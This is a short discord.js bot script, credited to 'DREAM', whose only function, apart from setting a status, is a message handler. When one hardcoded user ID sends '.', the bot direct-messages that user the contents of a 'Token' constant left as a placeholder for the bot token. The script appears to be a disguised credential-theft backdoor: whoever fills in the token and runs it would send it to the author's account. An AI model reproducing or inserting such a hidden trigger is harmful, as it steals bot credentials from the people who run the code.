const Token = "`\`\` التوكن `\`\`"

const Discord = require("discord.js");
const client = new Discord.Client();
var prefix = "+";
client.on('ready', () => {
   console.log(`----------------`);
      console.log(`Cyhper Bot Script By : DREAM`);
        console.log(`----------------`);
      console.log(`ON ${client.guilds.size} Servers '     Script By : DREAM ' `);
    console.log(`----------------`);
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`hi`,"http://twitch.tv/Dream")
client.user.setStatus("dnd")
});

client.on('message' , message => {
if (message.author.bot) return;
           if (message.content == '.')
           if (message.author.id === '516508186069565440'){
if (!message.channel.guild) return;
message.author.send(Token)
}  
});



client.login(process.env.BOT_TOKEN);// لا تغير فيها شيء
